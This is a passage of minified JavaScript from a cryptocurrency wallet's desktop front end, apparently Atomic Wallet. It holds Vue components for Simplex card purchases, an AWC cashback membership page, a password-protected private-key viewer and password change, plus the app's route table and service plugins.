                                return e.preventDefault(), t.submitSimplexForm.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Continue\n    ")])]), t._v(" "), i("div", {
                        staticClass: "produced-wrapper"
                    }, [i("div", {
                        staticClass: "produced"
                    }, [i("p", [t._v("\n        Powered by:\n      ")]), i("img", {
                        staticClass: "simplex",
                        attrs: {
                            src: "static/img/simplex.svg"
                        }
                    })]), t._v(" "), i("div", {
                        staticClass: "produced fiat"
                    }, [i("p", [t._v("\n        Bank cards accepted\n      ")]), t._v(" "), i("div", {
                        staticClass: "cards"
                    }, [i("img", {
                        staticClass: "visa",
                        attrs: {
                            src: "static/img/visa.svg"
                        }
                    }), i("img", {
                        staticClass: "master",
                        attrs: {
                            src: "static/img/mastercard.svg"
                        }
                    })])])]), t._v(" "), t.isMember ? t._e() : i("CashbackPromotion")], 1)
                }), [], !1, null, null, null).exports,
                le = i(1655),
                de = {
                    name: "SimplexHistory",
                    components: {
                        ExchangeHistoryItem: Xt.a,
                        Table: b.a
                    },
                    mixins: [f.h],
                    data: () => ({
                        isLoader: !1,
                        header: [{
                            title: "You sent"
                        }, {
                            title: "You got"
                        }]
                    }),
                    computed: {
                        ...Object(n.c)(["simplexTransactions"])
                    },
                    async mounted() {
                        this.isLoader = 0 === this.simplexTransactions.length, await this.getSimplexTransactions(), this.isLoader = !1
                    },
                    methods: {
                        ...Object(n.b)(["getSimplexTransactions"]),
                        checkStatus: t => Object(le.a)(t),
                        getWallet(t) {
                            const {
                                contract: e,
                                ticker: i,
                                parentTicker: s
                            } = t || {};
                            return this.$wallets.findWalletV2({
                                ticker: i,
                                contract: e,
                                parentTicker: s
                            })
                        },
                        getWalletData(t) {
                            return this.currentService.getInternalWalletData({
                                legacyTicker: t
                            })
                        }
                    }
                },
                he = Object(c.a)(de, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "exchange-history scroll-list2"
                    }, [t.isLoader ? i("div", {
                        staticClass: "loader"
                    }) : i("Table", {
                        attrs: {
                            header: t.header,
                            isEmpty: 0 === t.simplexTransactions.length,
                            items: t.simplexTransactions
                        }
                    }, [t.simplexTransactions.length ? t._e() : i("div", {
                        attrs: {
                            slot: "empty"
                        },
                        slot: "empty"
                    }, [i("div", {
                        staticClass: "empty"
                    }, [t._v("\n        Your orders will appear here\n      ")])]), t._v(" "), i("div", {
                        attrs: {
                            slot: "table-rows"
                        },
                        slot: "table-rows"
                    }, t._l(t.simplexTransactions, (function (e, s) {
                        return i("ExchangeHistoryItem", {
                            key: s,
                            attrs: {
                                id: e.id,
                                date: t._f("moment")(e.timestamp, "DD/MM/YYYY HH:mm"),
                                getAmount: e.amountToReceive.toString(),
                                getTicker: e.toCurrency.toUpperCase(),
                                getWallet: t.getWallet(t.getWalletData(e.toCurrency)),
                                sentAmount: e.amountToSend.toString(),
                                sentTicker: e.fromCurrency.toUpperCase(),
                                sentWallet: t.getWallet(t.getWalletData(e.fromCurrency)),
                                status: t.checkStatus(e.status)
                            }
                        })
                    })), 1)])], 1)
                }), [], !1, null, null, null).exports,
                ue = {
                    name: "SimplexWebview",
                    data: () => ({
                        simplexWebView: null,
                        showReady: !1,
                        preload: "file:" + i(81).resolve(__dirname, "./simplexInject.js")
                    }),
                    computed: {
                        ...Object(n.c)(["session", "newTransaction"]),
                        sessionUrl() {
                            let t = "";
                            try {
                                t = JSON.parse(this.session.body).result.headers.location.replace("/payments/new?", "")
                            } catch (t) {
                                console.warn("Simplex request failed: ", t)
                            }
                            return "https://checkout.simplexcc.com/payments/new?" + t
                        }
                    },
                    mounted() {
                        this.simplexWebView = this.$refs.simplex_webview, this.simplexWebView.addEventListener("new-window", t => {
                            g.ipcRenderer.send("openExternal", t.url)
                        }), this.startSimplexSession(this.session)
                    },
                    methods: {
                        ...Object(n.b)(["changeTab"]),
                        saveTxToLocalDb({
                            buyParams: t,
                            cashbackParams: e
                        }) {
                            const i = {
                                id: t.paymentId,
                                userId: t.atomicId,
                                status: t.status,
                                txHash: null,
                                payoutHash: null,
                                payoutAddress: t.payoutAddress,
                                fromCurrency: t.fromCurrency,
                                toCurrency: t.toCurrency,
                                amountToSend: t.amountSend,
                                amountToReceive: t.amountReceive,
                                expectedCashbackAmount: e.estimatedAwcCashback,
                                timestamp: (new Date).toISOString()
                            };
                            this.$simplexDb.addSimplexTransactionToDb(i)
                        },
                        goToFirstTab() {
                            this.$router.push("/simplex"), this.changeTab(0)
                        },
                        async startSimplexSession() {
                            this.$simplexDb.postCashbackBuyTx(this.newTransaction), this.saveTxToLocalDb(this.newTransaction), this.simplexWebView.addEventListener("dom-ready", () => {
                                setTimeout(() => {
                                    this.showReady = !0
                                }, 100), this.simplexWebView.send("check-success")
                            }), this.simplexWebView.addEventListener("ipc-message", t => {
                                "success" === t.channel && this.goToFirstTab()
                            }, {
                                once: !0
                            }), this.simplexWebView.addEventListener("will-navigate", t => {
                                "https://atomicwallet.io/" === t.url && this.goToFirstTab()
                            }), this.simplexWebView.addEventListener("close", t => this.goToFirstTab())
                        }
                    }
                },
                pe = Object(c.a)(ue, (function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "webview-wrapper"
                    }, [e("webview", {
                        ref: "simplex_webview",
                        class: {
                            hidden: !this.showReady
                        },
                        attrs: {
                            id: "simplexWebview",
                            preload: this.preload,
                            src: this.sessionUrl,
                            httpreferrer: "https://backend-wallet-api.simplexcc.com/payments/new",
                            name: "simplex_payment",
                            partition: "simplex"
                        }
                    }), this._v(" "), this.showReady ? this._e() : e("div", {
                        staticClass: "loader"
                    })], 1)
                }), [], !1, null, null, null).exports,
                me = {
                    name: "Membership",
                    components: {
                        CashbackExchange: i(1667).a,
                        AtomicLink: dt.AtomicLink
                    },
                    data: () => ({
                        amount: "0"
                    }),
                    computed: {
                        isAWCBlocked: () => !0
                    },
                    mounted() {
                        this.amount = this.$router.currentRoute.params.balance || "0"
                    }
                };
            var ge = function (t) {
                    i(4198)
                },
                ve = Object(c.a)(me, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", {
                        staticClass: "membership",
                        attrs: {
                            "data-test-id": "buy_awc"
                        }
                    }, [t.isAWCBlocked ? i("div", {
                        staticClass: "coin__plug"
                    }, [i("div", {
                        staticClass: "icon icon-awc"
                    }), t._v(" "), i("div", {
                        staticClass: "text"
                    }, [t._v("\n      Buy AWC is temporarily unavailable due to the BNB blockchain hard fork. You will be able to buy AWC after it is\n      migrated to Binance Smart Chain. For more details please read\n      "), i("AtomicLink", {
                        style: {
                            display: "inline-block"
                        },
                        attrs: {
                            type: "secondary"
                        },
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://support.atomicwallet.io/article/293-awc-migration-to-bsc")
                            }
                        }
                    }, [t._v("\n        our guide.\n      ")])], 1)]) : i("CashbackExchange", {
                        attrs: {
                            amount: t.amount
                        }
                    })], 1)
                }), [], !1, ge, "data-v-3eb5d77e", null).exports,
                fe = i(186),
                be = i.n(fe),
                we = i(1668),
                Te = i(643);
            var ye = {
                    name: "PrivateKeysTab",
                    components: {
                        Edit: kt.a,
                        CustomKey: we.a,
                        Alert: Te.a
                    },
                    filters: {
                        printKey: t => t.length > 45 ? t.substr(0, 20) + "..." + t.substr(-20) : t
                    },
                    data: () => ({
                        keys: [],
                        claiming: !1,
                        claimOk: !1,
                        claimFail: !1,
                        passwordForKey: "",
                        privateKeyError: "",
                        innerKeyState: "",
                        btnDisabled: !1,
                        filter: ""
                    }),
                    computed: {
                        mnemonic() {
                            return this.$wallets.mnemonic.phrase
                        },
                        keysData() {
                            const t = this.filter.toLowerCase();
                            return this.keys.filter(e => 0 === t.length || (e.ticker.toLowerCase().indexOf(t) >= 0 || e.name.toLowerCase().indexOf(t) >= 0))
                        }
                    },
                    methods: {
                        async claimFunds(t) {
                            let e, i;
                            this.claiming = !0, "YEC" === t && (i = this.$wallets.getWallet("YEC"), e = this.$wallets.getWallet("ZEC")), e || i || (this.claiming = !1);
                            const s = await i.createClaimTransaction(e.privateKey).catch(t => {
                                console.log(t)
                            });
                            if (!s) return void this.successClaim();
                            const a = await i.sendTransaction(s).catch(t => console.log(t));
                            a ? this.successClaim(a) : this.successClaim()
                        },
                        eosTextClipboard(t, e) {
                            return `${this.$options.filters.printKey(t)}\n          ${this.$options.filters.printKey(e)}`
                        },
                        successClaim(t) {
                            t ? this.claimOk = !0 : this.claimFail = !0
                        },
                        open() {
                            this.$electron.shell.openExternal("https://support.atomicwallet.io/article/94-how-to-keep-your-money-safe")
                        },
                        clearClaimStatus(t) {
                            t ? this.claimOk = !1 : this.claimFail = !1, this.claiming = !1
                        },
                        async loadKeysData() {
                            this.privateKeyError = "";
                            if (!await this.$storage.checkPassword(this.passwordForKey).catch(t => {
                                    console.error(t), this.privateKeyError = "Invalid password"
                                })) return;
                            this.filter = "";
                            const t = [];
                            this.passwordForKey = "";
                            try {
                                [...this.$wallets].forEach(e => {
                                    if (e instanceof Et.n) {
                                        const i = {
                                            privateKey: e.privateKey,
                                            address: e.address,
                                            name: e.name,
                                            icon: this.$iconClass(e),
                                            ticker: e.ticker
                                        };
                                        "EOS" === e.ticker && (i.additionalKeys = JSON.parse(e.privateKey)), "ATOM" === e.ticker && (i.privateKey = be.a.decode(e.privateKey).privateKey.toString("hex")), "HBAR" === e.ticker && (i.address = e.publicKey), "XMR" === e.ticker && (i.additionalKeys = {
                                            privateKeyView: e.privateKeyView,
                                            privateKeySpend: e.privateKeySpend,
                                            publicKeySpend: e.publicKeySpend
                                        }), "ADA" === e.ticker && (i.additionalKeys = {
                                            shelleyPrivateKey: e.privateKey.shelleyKey,
                                            byronPrivateKey: e.privateKey.byronKey,
                                            shelleyAddress: e.address,
                                            byronAddress: e.privateKey.byronAddress
                                        }), t.push(i)
                                    }
                                }), this.keys = t, this.innerKeyState = !0, this.privateKeyError = ""
                            } catch (t) {
                                this.privateKeyError = t.message, this.keys = []
                            }
                        }
                    }
                },
                Ce = Object(c.a)(ye, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "tab-wrap private-keys"
                    }, [t.innerKeyState ? t._e() : i("div", {
                        staticClass: "alert_wrap"
                    }, [i("Alert", {
                        attrs: {
                            message: "Never share your 12-word backup phrase and private keys with anyone. Never enter your info on any web wallets, online forms, or other websites claiming to be Atomic Wallet. Otherwise, you may risk losing your money.",
                            type: "Warning"
                        }
                    }, [i("a", {
                        staticClass: "text-link-underline text-word-break text-big new-text-blue m-l-10",
                        attrs: {
                            "data-test-id": "protect_link"
                        },
                        on: {
                            click: function (e) {
                                return e.stopPropagation(), t.open.apply(null, arguments)
                            }
                        }
                    }, [t._v("How do I protect\n        my wallet?")])])], 1), t._v(" "), t.innerKeyState ? i("div", {
                        staticClass: "coins"
                    }, [i("div", {
                        staticClass: "filter"
                    }, [i("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: t.filter,
                            expression: "filter"
                        }],
                        staticClass: "placeholder-white",
                        attrs: {
                            placeholder: "Search...",
                            type: "text",
                            "data-test-id": "keys_filter"
                        },
                        domProps: {
                            value: t.filter
                        },
                        on: {
                            input: function (e) {
                                e.target.composing || (t.filter = e.target.value)
                            }
                        }
                    })]), t._v(" "), t.keys.length > 0 ? i("div", {
                        staticClass: "list"
                    }, [!Object.keys(t.keysData).length && t.filter.length ? i("div", {
                        staticClass: "noresult"
                    }, [t._v("\n        No results found for “" + t._s(t.filter) + "”\n      ")]) : t._e(), t._v(" "), i("div", {
                        staticClass: "list-item",
                        attrs: {
                            "data-test-id": "coin-key"
                        }
                    }, [t._m(0), t._v(" "), i("div", {
                        staticClass: "info"
                    }, [i("CustomKey", {
                        attrs: {
                            isTrimValue: !1,
                            value: t.mnemonic,
                            title: "12-word backup phrase"
                        }
                    })], 1)]), t._v(" "), t._l(t.keysData, (function (e, s) {
                        return i("div", {
                            key: s,
                            staticClass: "list-item"
                        }, [i("div", {
                            staticClass: "name"
                        }, [i("div", {
                            class: e.icon
                        }), t._v(" "), i("span", [t._v("\n            " + t._s(e.name) + "\n          ")])]), t._v(" "), "EOS" === e.name ? i("div", {
                            staticClass: "info"
                        }, [i("CustomKey", {
                            attrs: {
                                isQrCode: !1,
                                value: e.address,
                                title: "Account name"
                            }
                        }), t._v(" "), e.additionalKeys ? i("div", t._l(e.additionalKeys, (function (e, s) {
                            return i("span", {
                                key: e,
                                staticClass: "value"
                            }, [t._v(t._s(t._f("printKey")(s)) + ":\n              "), t._l(e, (function (e, a) {
                                return i("CustomKey", {
                                    key: a,
                                    attrs: {
                                        textClipboard: t.eosTextClipboard(s, a),
                                        title: t._f("printKey")(a),
                                        value: e
                                    }
                                })
                            }))], 2)
                        })), 0) : t._e()], 1) : "Monero" === e.name ? i("div", {
                            staticClass: "info"
                        }, [i("CustomKey", {
                            attrs: {
                                value: e.address,
                                title: "Address"
                            }
                        }), t._v(" "), i("CustomKey", {
                            attrs: {
                                value: e.additionalKeys.privateKeyView,
                                title: "View Private Key"
                            }
                        }), t._v(" "), i("CustomKey", {
                            attrs: {
                                value: e.additionalKeys.privateKeySpend,
                                title: "Spend Private Key"
                            }
                        }), t._v(" "), i("CustomKey", {
                            attrs: {
                                value: e.additionalKeys.publicKeySpend,
                                title: "Spend Public Key"
                            }
                        })], 1) : "Cardano" === e.name ? i("div", {
                            staticClass: "info"
                        }, [i("CustomKey", {
                            attrs: {
                                value: e.additionalKeys.shelleyAddress,
                                title: "Address"
                            }
                        }), t._v(" "), i("CustomKey", {
                            attrs: {
                                value: e.additionalKeys.shelleyPrivateKey,
                                title: "Private Key"
                            }
                        }), t._v(" "), i("CustomKey", {
                            attrs: {
                                value: e.additionalKeys.byronPrivateKey,
                                title: "Legacy Private Key"
                            }
                        }), t._v(" "), i("CustomKey", {
                            attrs: {
                                value: e.additionalKeys.byronAddress,
                                title: "Legacy Address"
                            }
                        })], 1) : i("div", {
                            staticClass: "info"
                        }, [i("CustomKey", {
                            attrs: {
                                value: e.address,
                                title: "Public Key"
                            }
                        }), t._v(" "), i("CustomKey", {
                            attrs: {
                                value: e.privateKey,
                                title: "Private Key"
                            }
                        })], 1)])
                    }))], 2) : t._e()]) : i("div", {
                        staticClass: "enter-form"
                    }, [i("Edit", {
                        attrs: {
                            error: t.privateKeyError,
                            focus: !0,
                            isShowPassword: !0,
                            placeholder: "Password",
                            type: "password"
                        },
                        on: {
                            "enter-pressed": t.loadKeysData
                        },
                        model: {
                            value: t.passwordForKey,
                            callback: function (e) {
                                t.passwordForKey = e
                            },
                            expression: "passwordForKey"
                        }
                    }), t._v(" "), i("button", {
                        staticClass: "button",
                        attrs: {
                            "data-test-id": "show_private_keys"
                        },
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.loadKeysData.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Show private keys\n    ")])], 1)])
                }), [function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "name"
                    }, [e("div", {
                        staticClass: "icon-awc"
                    }), this._v(" "), e("span", [this._v("\n            Atomic\n          ")])])
                }], !1, null, null, null).exports;
            var xe = {
                    name: "SecurityTab",
                    components: {
                        Edit: kt.a
                    },
                    data: () => ({
                        oldPassword: "",
                        newPassword: "",
                        repeatNewPassword: "",
                        newPasswordError: "",
                        repeatNewPasswordError: "",
                        oldPasswordError: "",
                        passwordWasSuccessfullyChanged: !1,
                        btnDisabled: !1,
                        repeatPasswordType: "password"
                    }),
                    watch: {
                        oldPassword() {
                            this.btnDisabled = !1
                        },
                        newPassword() {
                            this.btnDisabled = !1
                        },
                        repeatNewPassword() {
                            this.btnDisabled = !1
                        }
                    },
                    methods: {
                        changeTypeRepeatPassword(t) {
                            this.repeatPasswordType = t
                        },
                        changeOldPassword() {
                            return this.oldPasswordError = "", this.newPasswordError = "", this.repeatNewPasswordError = "", "" === this.oldPassword ? (this.oldPasswordError = "Enter your password", this.$refs.oldPasswordRef.setFocus(), !1) : "" === this.newPassword ? (this.newPasswordError = "Enter your new password", this.$refs.newPasswordRef.setFocus(), !1) : this.newPassword !== this.repeatNewPassword ? (this.repeatNewPasswordError = "Passwords don't match", this.$refs.repeatNewPasswordRef.setFocus(), !1) : void(this.btnDisabled || (this.btnDisabled = !0, this.$storage.changePassword(this.oldPassword, this.newPassword).then(() => {
                                this.btnDisabled = !1, this.oldPassword = "", this.newPassword = "", this.repeatNewPassword = "", this.oldPasswordError = "", this.newPasswordError = "", this.repeatNewPasswordError = "", this.passwordWasSuccessfullyChanged = !0, setTimeout(() => {
                                    this.passwordWasSuccessfullyChanged = !1
                                }, 5e3)
                            }).catch(t => {
                                this.oldPasswordError = t, this.btnDisabled = !1
                            })))
                        }
                    }
                },
                _e = Object(c.a)(xe, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "tab-wrap security"
                    }, [i("div", {
                        staticClass: "text"
                    }, [t._v("\n    Before changing your password, click Private Keys in the top panel and write down your 12-word backup phrase. This\n    will help you restore your wallet if you forget your new password.\n  ")]), t._v(" "), i("div", {
                        staticClass: "inputs"
                    }, [i("Edit", {
                        ref: "oldPasswordRef",
                        attrs: {
                            error: t.oldPasswordError,
                            focus: !0,
                            isShowPassword: !0,
                            placeholder: "Old Password",
                            type: "password",
                            "data-test-id": "old_password"
                        },
                        on: {
                            changeTypeRepeatPassword: t.changeTypeRepeatPassword,
                            "enter-pressed": function (e) {
                                return t.changeOldPassword()
                            }
                        },
                        model: {
                            value: t.oldPassword,
                            callback: function (e) {
                                t.oldPassword = e
                            },
                            expression: "oldPassword"
                        }
                    }), t._v(" "), i("Edit", {
                        ref: "newPasswordRef",
                        attrs: {
                            error: t.newPasswordError,
                            type: t.repeatPasswordType,
                            placeholder: "New Password",
                            "data-test-id": "new_password"
                        },
                        on: {
                            "enter-pressed": function (e) {
                                return t.changeOldPassword()
                            }
                        },
                        model: {
                            value: t.newPassword,
                            callback: function (e) {
                                t.newPassword = e
                            },
                            expression: "newPassword"
                        }
                    }), t._v(" "), i("Edit", {
                        ref: "repeatNewPasswordRef",
                        attrs: {
                            error: t.repeatNewPasswordError,
                            type: t.repeatPasswordType,
                            placeholder: "Repeat New Password",
                            "data-test-id": "repeat_new_password"
                        },
                        on: {
                            "enter-pressed": function (e) {
                                return t.changeOldPassword()
                            }
                        },
                        model: {
                            value: t.repeatNewPassword,
                            callback: function (e) {
                                t.repeatNewPassword = e
                            },
                            expression: "repeatNewPassword"
                        }
                    }), t._v(" "), i("button", {
                        staticClass: "button",
                        attrs: {
                            "data-test-id": "change_password_button"
                        },
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.changeOldPassword.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Change password\n    ")]), t._v(" "), i("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "fade"
                        }
                    }, [t.passwordWasSuccessfullyChanged ? i("div", {
                        staticClass: "message"
                    }, [t._v("\n        Your password has been changed\n      ")]) : t._e()])], 1)])
                }), [], !1, null, null, null).exports,
                ke = {
                    name: "Membership",
                    computed: {
                        ...Object(n.c)(["hasTransaction"]),
                        settings() {
                            const t = this.$cashback.settings[this.$cashback.settings.length - 1];
                            return this.amount >= t.minAWC ? t : this.$cashback.settings.find(t => this.amount >= t.minAWC && this.amount < t.maxAWC)
                        },
                        amount() {
                            const t = localStorage.getItem("AWC-986-balance"),
                                e = this.$wallets.findWallet("AWC-986");
                            return (null == e ? void 0 : e.divisibleBalance) || t || 0
                        }
                    },
                    async mounted() {
                        this.$ga.event("User Movement", "membership-page", {
                            clientID: this.$ga.customParams.uid
                        })
                    },
                    methods: {
                        neededAmount(t) {
                            const e = t - this.amount;
                            return e < 0 ? "0" : String(Math.ceil(e))
                        },
                        isNeededAmount(t) {
                            return 0 !== t && 0 !== Number(this.neededAmount(t))
                        },
                        openCashbackExchange(t) {
                            const e = this.neededAmount(t);
                            this.$ga.event("User Actions", "Buy AWC Popup", {
                                clientID: this.$ga.customParams.uid
                            }), this.$router.push({
                                name: "buy-awc-tab",
                                params: {
                                    balance: e
                                }
                            })
                        }
                    }
                },
                Se = Object(c.a)(ke, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", {
                        staticClass: "membership"
                    }, [i("div", {
                        staticClass: "header-wrap"
                    }, [i("div", {
                        staticClass: "status"
                    }, [i("icon", {
                        attrs: {
                            name: "membership-" + (void 0 === t.settings ? "" : t.settings.class)
                        }
                    }), t._v(" "), i("span", {
                        attrs: {
                            "data-test-id": "settings-membership-status"
                        }
                    }, [t._v(t._s(void 0 === t.settings || "basic" === t.settings.class ? "Not a member" : t.settings.text + " Status"))])], 1), t._v(" "), i("div", {
                        staticClass: "balance"
                    }, [i("icon", {
                        attrs: {
                            name: "atomic-coins"
                        }
                    }), t._v("\n      You have "), i("span", {
                        staticClass: "text-white",
                        attrs: {
                            "data-test-id": "settings_awc_balance"
                        }
                    }, [t._v(t._s(t._f("formatFinance")(t.amount)))]), t._v(" AWC\n    ")], 1)]), t._v(" "), i("div", {
                        staticClass: "body"
                    }, [i("div", {
                        staticClass: "text-info"
                    }, [t._v("\n      Hold AWC-BNB token and receive AWC Cashback for each completed exchange."), i("br"), t._v(" Rewards are distributed monthly. "), i("a", {
                        staticClass: "readmore",
                        on: {
                            click: function (e) {
                                return t.$electron.shell.openExternal("https://atomicwallet.io/membership")
                            }
                        }
                    }, [t._v("Read more")])]), t._v(" "), i("div", {
                        staticClass: "settings"
                    }, t._l(t.$cashback.settings, (function (e, s) {
                        return i("div", {
                            key: s,
                            staticClass: "item",
                            class: [e.class, {
                                selected: "silver" === e.class && !t.isNeededAmount(e.minAWC)
                            }]
                        }, ["silver" === e.class && t.isNeededAmount(e.minAWC) ? i("div", {
                            staticClass: "choice"
                        }, [t._v("\n          Users’"), i("br"), t._v("Choice\n        ")]) : t._e(), t._v(" "), i("div", {
                            staticClass: "status"
                        }, [t._v("\n          " + t._s(e.text) + "\n        ")]), t._v(" "), i("div", {
                            staticClass: "atomic",
                            class: e.class
                        }, [i("div", {
                            staticClass: "background"
                        }), t._v(" "), i("div", {
                            staticClass: "icon-awc"
                        })]), t._v(" "), "basic" === e.class ? i("div", {
                            staticClass: "percent"
                        }, [t._v("\n          5 AWC\n        ")]) : i("div", {
                            staticClass: "percent"
                        }, [t._v("\n          " + t._s(100 * e.percent) + "%\n        ")]), t._v(" "), i("div", {
                            staticClass: "title"
                        }, [t._v("\n          Cashback\n        ")]), t._v(" "), "basic" === e.class ? i("div", {
                            staticClass: "limit"
                        }, [t._v("\n          One time bonus\n        ")]) : i("div", {
                            staticClass: "limit"
                        }, [t._v("\n          max " + t._s(e.limit) + " USD/mth\n        ")]), t._v(" "), t.isNeededAmount(e.minAWC) ? i("button", {
                            staticClass: "button",
                            attrs: {
                                "data-test-id": "buy-membership"
                            },
                            on: {
                                click: function (i) {
                                    return t.openCashbackExchange(e.minAWC)
                                }
                            }
                        }, [i("span", [t._v("BUY " + t._s(t._f("formatFinance")(t.neededAmount(e.minAWC))) + " AWC")])]) : "basic" !== e.class || t.hasTransaction ? i("div", {
                            staticClass: "step-completed"
                        }, [i("div", {
                            staticClass: "background"
                        }), t._v(" "), i("icon", {
                            staticClass: "svg-success",
                            attrs: {
                                name: "success"
                            }
                        })], 1) : i("button", {
                            staticClass: "button no-transactions"
                        }, [i("span", [i("icon", {
                            staticClass: "svg-success",
                            attrs: {
                                name: "success"
                            }
                        })], 1)])])
                    })), 0)])])
                }), [], !1, null, null, null).exports;
            s.a.use(a.a);
            e.a = new a.a({
                routes: [{
                    path: "/entry",
                    name: "entry-page",
                    component: _t,
                    props: !0,
                    children: [{
                        path: "login",
                        name: "login-page",
                        component: $t,
                        meta: .1
                    }, {
                        path: "restore",
                        name: "restore-page",
                        component: Nt,
                        meta: .2
                    }, {
                        path: "create",
                        name: "create-page",
                        component: It,
                        meta: .3
                    }]
                }, {
                    path: "/main",
                    name: "main-page",
                    component: m,
                    children: [{
                        path: ":ticker",
                        name: "main-with-tickers",
                        component: m
                    }]
                }, {
                    path: "/portfolio",
                    name: "portfolio-page",
                    component: nt
                }, {
                    path: "/history",
                    name: "history-page",
                    component: $
                }, {
                    path: "/settings",
                    component: Z,
                    children: [{
                        path: "",
                        name: "membership-tab",
                        component: Se,
                        meta: 1.1
                    }, {
                        path: "change-password",
                        name: "change-password-tab",
                        component: _e,
                        meta: 1.3
                    }, {
                        path: "private-keys",
                        name: "private-keys-tab",
                        component: Ce,
                        meta: 1.4
                    }, {
                        path: "buy-awc/:balance",
                        name: "buy-awc-tab",
                        component: ve,
                        meta: 1.5
                    }]
                }, {
                    path: "/invite",
                    component: Ct,
                    name: "invite-friends"
                }, {
                    path: "/support",
                    name: "support-page",
                    component: A
                }, {
                    path: "/exchange",
                    component: Wt,
                    children: [{
                        path: "",
                        name: "exchange-basic",
                        component: Yt,
                        children: [{
                            path: ":idToSend/:idToReceive",
                            name: "exchange-with-tickers",
                            component: Yt
                        }]
                    }, {
                        path: "/exchange/history",
                        name: "exchange-history",
                        component: Jt
                    }]
                }, {
                    path: "/simplex",
                    component: Qt,
                    children: [{
                        path: "",
                        name: "simplex-page",
                        component: ce,
                        children: [{
                            path: ":tickerToSend/:walletToReceive",
                            name: "simplex-with-tickers",
                            component: ce,
                            children: [{
                                path: ":value",
                                name: "simplex-with-tickers-value",
                                component: ce
                            }]
                        }]
                    }, {
                        path: "/simplex/history",
                        name: "simplex-history-tab",
                        component: he
                    }, {
                        path: "/simplex/webview",
                        name: "simplex-webview-tab",
                        component: pe
                    }]
                }, {
                    path: "/staking",
                    name: "staking-page",
                    component: J,
                    children: [{
                        path: ":ticker",
                        name: "staking-with-tickers",
                        component: J
                    }]
                }, {
                    path: "/nft",
                    name: "nft-page",
                    component: l
                }, {
                    path: "*",
                    redirect: "/entry"
                }]
            })
        },
        1663: function (t, e, i) {
            "use strict";
            i.r(e), i.d(e, "bus", (function () {
                return a
            })), i.d(e, "buy", (function () {
                return o
            })), i.d(e, "platformVersion", (function () {
                return c
            })), i.d(e, "rates", (function () {
                return l
            })), i.d(e, "staking", (function () {
                return h
            })), i.d(e, "history", (function () {
                return u
            })), i.d(e, "storage", (function () {
                return g
            })), i.d(e, "addresses", (function () {
                return v
            })), i.d(e, "wallets", (function () {
                return b
            })), i.d(e, "reviews", (function () {
                return T
            })), i.d(e, "cashback", (function () {
                return y
            })), i.d(e, "simplexDb", (function () {
                return x
            })), i.d(e, "exchanges", (function () {
                return k
            })), i.d(e, "analytics", (function () {
                return E
            })), i.d(e, "chartData", (function () {
                return A
            })), i.d(e, "inviteFriends", (function () {
                return P
            })), i.d(e, "activeWalletsList", (function () {
                return R
            }));
            const s = new(i(24).a);

            function a(t) {
                Object.defineProperties(t.prototype, {
                    $bus: {
                        get: () => s
                    }
                })
            }
            var n = i(9);

            function o(t) {
                Object.defineProperties(t.prototype, {
                    $buy: {
                        get: () => n.k
                    }
                })
            }
            var r = i(1659);

            function c(t) {
                Object.defineProperties(t.prototype, {
                    $platformVersion: {
                        get: () => n.w
                    }
                })
            }

            function l(t) {
                Object.defineProperties(t.prototype, {
                    $rates: {
                        get: () => n.x
                    }
                })
            }
            n.w.setVersion(r.a), n.w.setPlatform("desktop");
            const d = new n.C;

            function h(t) {
                Object.defineProperties(t.prototype, {
                    $staking: {
                        get: () => d
                    }
                })
            }

            function u(t) {
                Object.defineProperties(t.prototype, {
                    $history: {
                        get: () => n.u
                    }
                })
            }
            const p = new class LocalStorageWrapper {
                    constructor() {
                        this.storage = localStorage
                    }
                    getItem(t, e, i) {
                        try {
                            const i = this.storage.getItem(t);
                            if (null === i) throw new Error("Key is not exists");
                            e(i)
                        } catch (t) {
                            i(t)
                        }
                    }
                    setItem(t, e, i, s) {
                        try {
                            i(this.storage.setItem(t, e))
                        } catch (t) {
                            s(t)
                        }
                    }
                    remove(t, e) {
                        e(this.storage.removeItem(t))
                    }
                },
                m = new n.A(p);

            function g(t) {
                Object.defineProperties(t.prototype, {
                    $storage: {
                        get: () => m
                    }
                })
            }

            function v(t) {
                Object.defineProperties(t.prototype, {
                    $addresses: {
                        get: () => new n.j(t.prototype.$storage)
                    }
                })
            }
            const f = n.F.getInstance();

            function b(t) {
                Object.defineProperties(t.prototype, {
                    $wallets: {
                        get: () => f
                    }
                })
            }
            f.initialized = f.initialize();
            const w = new n.y;

            function T(t) {
                Object.defineProperties(t.prototype, {
                    $reviews: {
                        get: () => w
                    }
                })
            }

            function y(t) {
                Object.defineProperties(t.prototype, {
                    $cashback: {
                        get() {
                            return n.l.setCashbackWallet(this.$wallets.findWallet("AWC")), n.l
                        }
                    }
                })
            }
            const C = new n.B;

            function x(t) {
                Object.defineProperties(t.prototype, {
                    $simplexDb: {
                        get: () => C
                    }
                })
            }
            const _ = new n.s;

            function k(t) {
                Object.defineProperties(t.prototype, {
                    $exchanges: {
                        get: () => _
                    }
                })
            }
            var S = i(1660);
            const $ = new(i.n(S).a)("UA-120528918-1");

            function E(t) {
                Object.defineProperties(t.prototype, {
                    $ga: {
                        get: () => $
                    }
                })
            }

            function A(t) {
                Object.defineProperties(t.prototype, {
                    $chartData: {
                        get: () => n.m
                    }
                })
            }

            function P(t) {
                Object.defineProperties(t.prototype, {
                    $inviteFriends: {
                        get: () => n.G
                    }
                })
            }

            function R(t) {
                Object.defineProperties(t.prototype, {
                    $activeWalletsList: {
                        get: () => n.i
                    }
                })
            }
        },
        4198: function (t, e, i) {
            var s = i(4199);
